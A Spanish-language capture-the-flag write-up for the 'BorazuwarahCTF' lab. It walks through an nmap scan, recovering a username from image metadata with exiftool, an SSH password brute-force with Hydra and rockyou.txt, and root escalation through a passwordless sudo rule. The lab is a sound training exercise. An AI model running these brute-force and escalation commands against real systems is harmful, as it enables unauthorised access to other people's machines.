# BorazuwarahCTF

## Descripción

Laboratorio para practicar **esteganografía** y **fuerza bruta** contra protocolos de red.

## Reconocimiento

La máquina es **Linux**, identificado por un **TTL de 64**.

Se realiza un escaneo con Nmap:

```bash
nmap -sV 172.17.0.2
```

El resultado muestra dos puertos abiertos:

- **22** → SSH
- **80** → HTTP

## Análisis de la página web

Al acceder desde el navegador al puerto **80** se observa una página que únicamente muestra un **huevo Kinder**.

Como el laboratorio está orientado a la **esteganografía**, la imagen es el primer objetivo de análisis.

## Análisis de metadatos

Se descarga la imagen y se inspecciona con `exiftool`:

```bash
exiftool imagenHuevo.jpeg
```

Salida:

```text
ExifTool Version Number         : 13.55
File Name                       : imagenHuevo.jpeg
Directory                       : .
File Size                       : 19 kB
File Modification Date/Time     : 2026:07:17 13:07:03-04:00
File Access Date/Time           : 2026:07:17 13:07:42-04:00
File Inode Change Date/Time     : 2026:07:17 13:07:03-04:00
File Permissions                : -rw-rw-r--
File Type                       : JPEG
File Type Extension             : jpg
MIME Type                       : image/jpeg
JFIF Version                    : 1.01
Resolution Unit                 : None
X Resolution                    : 1
Y Resolution                    : 1
XMP Toolkit                     : Image::ExifTool 12.76
Description                     : ---------- User: borazuwarah ----------
Title                           : ---------- Password: ----------
Image Width                     : 455
Image Height                    : 455
Encoding Process                : Baseline DCT, Huffman coding
Bits Per Sample                 : 8
Color Components                : 3
Y Cb Cr Sub Sampling            : YCbCr4:2:0 (2 2)
Image Size                      : 455x455
Megapixels                      : 0.207
```

En los metadatos se encuentra el usuario:

- **Usuario:** `borazuwarah`

No se obtiene ninguna contraseña, por lo que el siguiente paso es realizar un ataque de fuerza bruta sobre el servicio SSH.

---

# Fuerza bruta con Hydra

Conociendo el usuario, se utiliza **Hydra** junto al diccionario `rockyou.txt`:

```bash
hydra -l borazuwarah -P /usr/share/wordlists/rockyou.txt ssh://172.17.0.2/ -t 4 -v
```

Resultado:

```text
Hydra v9.7 (c) 2023 by van Hauser/THC & David Maciejak

[DATA] attacking ssh://172.17.0.2:22/
[INFO] Successful, password authentication is supported

[22][ssh] host: 172.17.0.2
login: borazuwarah
password: 123456

1 of 1 target successfully completed, 1 valid password found
```

Se obtienen las credenciales:

- **Usuario:** `borazuwarah`
- **Contraseña:** `123456`

---

# Acceso por SSH

Se inicia sesión mediante SSH con las credenciales encontradas.

Una vez dentro, se comprueban los privilegios del usuario:

```bash
sudo -l
```

Salida:

```text
Matching Defaults entries for borazuwarah on f7d298b32b5d:
    env_reset, mail_badpass, secure_path=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin, use_pty

User borazuwarah may run the following commands on f7d298b32b5d:
    (ALL : ALL) ALL
    (ALL) NOPASSWD: /bin/bash
```

Se observa que el usuario puede ejecutar `/bin/bash` como **root** sin necesidad de introducir contraseña.

---

# Enumeración

Se comprueba el contenido del directorio personal:

```bash
ls
```

No devuelve ningún archivo.

Intentando utilizar `ll`:

```bash
ll
```

Resultado:

```text
-bash: ll: command not found
```

Se listan los archivos ocultos:

```bash
ls -a
```

Salida:

```text
.
..
.bash_logout
.bashrc
.profile
.sudo_as_admin_successful
```

Se verifica el directorio actual:

```bash
pwd
```

Salida:

```text
/home/borazuwarah
```

---

# Escalada de privilegios

Aunque era suficiente ejecutar:

```bash
sudo /bin/bash
```

en este caso se utilizó:

```bash
sudo su
```

Introduciendo la contraseña del usuario:

```text
[sudo] password for borazuwarah:
```

Se obtiene una shell como **root**:

```text
root@f7d298b32b5d:/home/borazuwarah#
```

Con esto se consigue el control total de la máquina.
